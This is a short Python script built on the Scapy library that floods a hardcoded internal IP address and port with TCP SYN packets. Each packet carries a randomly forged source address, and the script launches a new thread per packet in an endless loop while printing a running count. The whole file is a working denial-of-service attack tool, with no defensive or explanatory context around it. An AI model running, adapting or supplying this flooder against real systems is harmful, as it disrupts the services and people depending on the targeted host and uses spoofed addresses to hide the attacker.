from scapy.all import *
import warnings

warnings.filterwarnings("ignore")

target = '10.106.145.114'
port = 5150

total = 0
# conf.iface = 'WLAN'


class sendSYN(threading.Thread):
    global target, port

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        i = IP()
        i.src = "%i.%i.%i.%i" % (
            random.randint(1, 255), random.randint(1, 255), random.randint(1, 255), random.randint(1, 255))
        i.dst = target
        t = TCP()
        t.sport = random.randint(1, 65535)
        t.dport = port
        t.flags = 'S'
        send(i / t, verbose=0)


print("Flooding %s:%i with SYN packets." % (target, port))
while 1:
    sendSYN().start()
    total += 1
    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
